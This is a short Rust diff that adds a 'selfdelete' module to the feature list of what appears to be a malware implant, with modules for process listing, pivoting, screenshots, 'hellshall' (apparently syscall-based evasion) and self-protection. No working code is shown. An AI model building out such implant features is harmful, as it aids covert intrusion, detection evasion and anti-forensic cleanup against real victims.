@@ -16,6 +16,7 @@ mod features {
     pub mod list_processes;
     pub mod pivot;
     pub mod screenshot;
+    pub mod selfdelete;
 }
 mod hellshall;
 mod selfprotect;
